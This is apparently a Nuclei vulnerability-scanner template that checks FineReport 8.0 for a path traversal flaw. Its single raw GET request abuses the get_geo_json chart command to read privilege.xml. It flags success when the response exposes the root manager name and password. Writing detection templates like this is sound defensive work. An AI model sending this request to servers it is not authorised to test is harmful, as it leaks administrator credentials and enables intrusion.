id: finereport-path-traversal1
info:
  author: pikpikcu
  name: FineReport 8.0 Path Traversal
  reference: http://foreversong.cn/archives/1378
  severity: medium
  tags: finereport,lfi
http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <rootManagerName>
    - <rootManagerPassword>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
